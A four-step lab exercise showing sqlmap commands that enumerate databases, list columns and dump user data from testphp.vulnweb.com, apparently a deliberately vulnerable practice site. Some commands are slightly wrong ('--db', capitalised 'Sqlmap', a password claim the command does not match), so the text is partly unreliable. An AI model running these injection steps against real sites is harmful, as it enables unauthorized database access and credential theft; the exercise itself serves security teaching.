1.	Install Kali linux on virtual box and type sqlmap -h in terminal to view commands 
2.	Find the database name used in the given website by following command 
sqlmap -u testphp.vulnweb.com/artists.php?artist=1 --db
3.	Find the schema of the table used in given Database by following command
Sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acurat -T users --columns --random-agent
4.	Obtaining username and password from database by following command
Sqlmap -u testphp.vulnweb.com/artists.php?artist=1 -D acurat -T users -C uname --dump
